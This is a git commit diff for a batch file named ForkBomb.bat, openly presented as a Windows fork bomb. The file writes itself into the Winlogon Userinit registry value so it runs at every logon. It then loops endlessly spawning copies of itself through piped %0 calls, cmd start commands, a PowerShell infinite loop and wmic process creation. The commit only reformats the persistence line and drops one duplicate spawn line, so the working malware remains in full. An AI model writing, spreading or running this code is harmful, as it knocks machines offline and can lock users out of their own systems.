e17c499abb0e635aedeafa587f6eefe11645ec18
ITTM <asinmaxim14@gmail.com>
2025-10-18 11:49:34 +0700

    Update ForkBomb.bat

--- ForkBomb.bat
+++ ForkBomb.bat
@@ -1,5 +1,7 @@
 @echo off
-reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Userinit /t REG_SZ /d "C:\Windows\system32\userinit.exe,%~f0" /f
+
+reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Userinit /t REG_SZ /d "C:\Windows\system32\userinit.exe,%~f0" /f 
+
 :loop
 %0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|
 
@@ -8,7 +10,4 @@ start cmd /c "%0"
 start powershell -Command "while(1){Start-Process cmd.exe}"
 
 wmic process call create "cmd.exe /c %0"
-
-
-start cmd /c "%0"
 goto loop
